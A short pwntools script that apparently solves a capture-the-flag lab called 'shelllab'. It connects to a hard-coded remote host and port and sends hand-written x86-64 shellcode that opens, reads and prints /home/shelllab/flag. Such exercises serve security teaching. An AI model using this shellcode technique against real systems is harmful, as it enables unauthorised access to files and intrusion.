#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'

"""
f = open('sc.o', 'rb')
# can see it from objdump -h
f.seek(0x00000180)
sc = f.read(0x50)
f.close()
"""

r = remote('140.112.31.97', 30101)

shellcode = asm('''
    ; open ;
    mov rax, 0x67616c
    push rax
    mov rax, 0x662f62616c6c6c65
    push rax
    mov rax, 0x68732f656d6f682f; /home/shelllab/flag
    push rax
    mov rdi, rsp
    mov rax, 2
    mov rsi, 0
    mov rdx, 0
    syscall
    ; read ;
    mov rdi, rax
    mov rax, 0
    lea rsi, [rsp+0x30]
    mov rdx, 0x30
    syscall
    ; write ;
    mov rax, 1
    mov rdi, 1
    syscall
    ''')

r.sendline(shellcode)
r.interactive()
